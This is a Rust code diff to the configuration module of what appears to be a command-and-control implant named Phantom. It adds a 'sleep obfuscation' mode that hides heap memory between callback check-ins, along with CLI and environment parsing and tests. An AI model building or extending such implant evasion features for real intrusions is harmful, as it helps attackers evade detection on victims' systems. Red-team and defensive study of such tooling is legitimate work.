@@ -3,6 +3,7 @@
 use std::ffi::{OsStr, OsString};
 
 use crate::error::PhantomError;
+use crate::sleep_obfuscate::SleepMode;
 
 /// Configuration inputs that control Phantom's callback transport and timing.
 #[derive(Debug, Clone)]
@@ -27,6 +28,12 @@ pub struct PhantomConfig {
     pub kill_date: Option<i64>,
     /// Optional working-hours bitmask carried in init metadata.
     pub working_hours: Option<i32>,
+    /// Sleep obfuscation technique applied between check-ins.
+    ///
+    /// Defaults to [`SleepMode::Mprotect`] which marks anonymous heap pages
+    /// `PROT_NONE` during the sleep window.  Use `plain` when running under a
+    /// `seccomp` policy that denies `mprotect` or for debugging.
+    pub sleep_mode: SleepMode,
 }
 
 impl PhantomConfig {
@@ -77,11 +84,12 @@ impl PhantomConfig {
             "  --sleep-jitter N         Sleep jitter percentage (0-100)\n",
             "  --kill-date UNIX_TS      Exit after this Unix timestamp\n",
             "  --working-hours MASK     Working-hours bitmask advertised in init\n",
+            "  --sleep-mode MODE        Sleep obfuscation: plain or mprotect (default: mprotect)\n",
             "  -h, --help               Show this help text\n\n",
             "Environment:\n",
             "  PHANTOM_CALLBACK_URL, PHANTOM_INIT_SECRET, PHANTOM_USER_AGENT,\n",
             "  PHANTOM_SLEEP_DELAY_MS, PHANTOM_SLEEP_JITTER, PHANTOM_KILL_DATE,\n",
-            "  PHANTOM_WORKING_HOURS, PHANTOM_PINNED_CERT_PEM\n",
+            "  PHANTOM_WORKING_HOURS, PHANTOM_PINNED_CERT_PEM, PHANTOM_SLEEP_MODE\n",
         )
     }
 
@@ -118,6 +126,14 @@ impl PhantomConfig {
                 }
                 Some("PHANTOM_PINNED_CERT_PEM") => {
                     self.pinned_cert_pem = Some(parse_os_string(value, "PHANTOM_PINNED_CERT_PEM")?);
+                }
+                Some("PHANTOM_SLEEP_MODE") => {
+                    let s = parse_os_string(value, "PHANTOM_SLEEP_MODE")?;
+                    self.sleep_mode = SleepMode::parse(&s).ok_or_else(|| {
+                        PhantomError::Argument(format!(
+                            "unknown sleep mode {s:?}; expected plain or mprotect"
+                        ))
+                    })?;
                 }
                 _ => {}
             }
@@ -171,6 +187,13 @@ impl PhantomConfig {
                 "--working-hours" => {
                     self.working_hours = Some(parse_string_value(&value, flag)?);
                 }
+                "--sleep-mode" => {
+                    self.sleep_mode = SleepMode::parse(&value).ok_or_else(|| {
+                        PhantomError::Argument(format!(
+                            "unknown sleep mode {value:?}; expected plain or mprotect"
+                        ))
+                    })?;
+                }
                 _ => return Err(PhantomError::Argument(format!("unknown argument {flag}"))),
             }
         }
@@ -192,6 +215,7 @@ impl Default for PhantomConfig {
             sleep_jitter: 0,
             kill_date: None,
             working_hours: None,
+            sleep_mode: SleepMode::default(),
         }
     }
 }
@@ -344,5 +368,46 @@ mod tests {
         let usage = PhantomConfig::usage();
         assert!(usage.contains("--callback-url"));
         assert!(usage.contains("PHANTOM_CALLBACK_URL"));
+        assert!(usage.contains("--sleep-mode"));
+        assert!(usage.contains("PHANTOM_SLEEP_MODE"));
+    }
+
+    #[test]
+    fn sleep_mode_env_plain() {
+        let config = PhantomConfig::from_sources(
+            ["phantom"],
+            [("PHANTOM_CALLBACK_URL", "https://ts.local/"), ("PHANTOM_SLEEP_MODE", "plain")],
+        )
+        .expect("config");
+        assert_eq!(config.sleep_mode, crate::sleep_obfuscate::SleepMode::Plain);
+    }
+
+    #[test]
+    fn sleep_mode_cli_overrides_env() {
+        let config = PhantomConfig::from_sources(
+            ["phantom", "--sleep-mode", "plain"],
+            [("PHANTOM_CALLBACK_URL", "https://ts.local/"), ("PHANTOM_SLEEP_MODE", "mprotect")],
+        )
+        .expect("config");
+        assert_eq!(config.sleep_mode, crate::sleep_obfuscate::SleepMode::Plain);
+    }
+
+    #[test]
+    fn sleep_mode_rejects_unknown_value() {
+        let err = PhantomConfig::from_sources(
+            ["phantom", "--sleep-mode", "turbo"],
+            std::iter::empty::<(&str, &str)>(),
+        )
+        .expect_err("unknown mode should fail");
+        assert!(matches!(
+            err,
+            crate::error::PhantomError::Argument(msg) if msg.contains("turbo")
+        ));
+    }
+
+    #[test]
+    fn default_sleep_mode_is_mprotect() {
+        let config = PhantomConfig::default();
+        assert_eq!(config.sleep_mode, crate::sleep_obfuscate::SleepMode::Mprotect);
     }
 }
